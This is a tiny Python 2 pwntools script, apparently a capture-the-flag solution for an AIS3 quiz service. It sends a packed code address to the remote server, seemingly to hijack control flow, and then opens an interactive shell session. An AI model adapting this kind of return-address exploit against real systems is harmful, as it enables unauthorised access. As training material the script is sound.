from pwn import *


print p32(0x0804860a)
conn = remote('quiz.ais3.org', 9561)
conn.sendline(p32(0x08048613))
conn.interactive()
